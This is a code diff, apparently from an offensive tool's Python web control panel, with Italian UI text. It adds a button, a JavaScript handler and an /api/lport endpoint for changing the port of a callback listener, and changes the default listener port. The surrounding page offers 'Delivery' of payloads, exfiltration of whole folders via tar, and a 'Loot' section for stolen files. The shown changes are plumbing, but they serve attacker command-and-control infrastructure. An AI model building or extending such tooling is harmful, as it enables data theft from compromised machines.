+        f'border:1px solid var(--border);border-radius:4px;padding:3px 10px;font-size:11px;cursor:pointer">Applica</button>'
+        f' <span id="lport-msg" style="font-size:11px;margin-left:4px"></span>'
+    )
 
     body = f"""<div class="container">
 <div class="breadcrumb"><a href="/">Home</a> <span>/</span> Delivery</div>
@@ -1862,7 +2057,19 @@ def _page_delivery() -> str:
 <div style="color:var(--text2);font-size:12px;margin:4px 0">Esfiltra cartelle intere compressi via tar</div>
 </div>
 <div style="margin-top:8px;font-size:12px;color:var(--text2)">I file sono consultabili nella sezione <a href="/loot/">Loot</a>.</div>
-</div>"""
+</div>
+<script>
+function setLport(){{
+  var v=document.getElementById('lport-val').value;
+  var msg=document.getElementById('lport-msg');
+  fetch('/api/lport',{{method:'POST',headers:{{'Content-Type':'application/json'}},body:JSON.stringify({{port:parseInt(v)}})}}
+  ).then(function(r){{return r.json();}}).then(function(d){{
+    if(d.ok){{msg.style.color='var(--green)';msg.textContent='Aggiornato a '+d.lport;setTimeout(function(){{location.reload();}},800);}}
+    else{{msg.style.color='var(--red)';msg.textContent=d.error||'Errore';}}
+  }}).catch(function(e){{msg.style.color='var(--red)';msg.textContent='Errore: '+e.message;}});
+}}
+document.getElementById('lport-val').addEventListener('keydown',function(e){{if(e.key==='Enter')setLport();}});
+</script>"""
     return _base_html("Delivery", body, active="delivery")
 
 
@@ -2199,6 +2406,8 @@ class SlRequestHandler(http.server.BaseHTTPRequestHandler):
             self._api_loot_delete()
         elif path == "/api/loot/clear":
             self._api_loot_clear()
+        elif path == "/api/lport":
+            self._api_lport()
         else:
             self.send_error(404)
 
@@ -2350,6 +2559,19 @@ class SlRequestHandler(http.server.BaseHTTPRequestHandler):
                 count += 1
         self._send_json({"ok": True, "deleted": count})
 
+    def _api_lport(self) -> None:
+        try:
+            body = json.loads(self._read_body())
+            port = int(body.get("port", 0))
+        except (json.JSONDecodeError, ValueError, TypeError):
+            self._send_json({"ok": False, "error": "JSON non valido"}, status=400)
+            return
+        msg = set_lport(port)
+        if "non valida" in msg:
+            self._send_json({"ok": False, "error": msg}, status=400)
+        else:
+            self._send_json({"ok": True, "lport": _lport})
+
     def _serve_loot_raw(self, name: str) -> None:
         if ".." in name or "/" in name or "\\" in name:
             self.send_error(403)
@@ -2379,7 +2601,7 @@ class _QuietTCPServer(socketserver.TCPServer):
         pass
 
 
-def start(port: int = 2727, lhost: str | None = None, lport: int = 4444) -> str:
+def start(port: int = 2727, lhost: str | None = None, lport: int = 2727) -> str:
     global _server, _thread, _lhost, _lport
 
     if _server is not None:
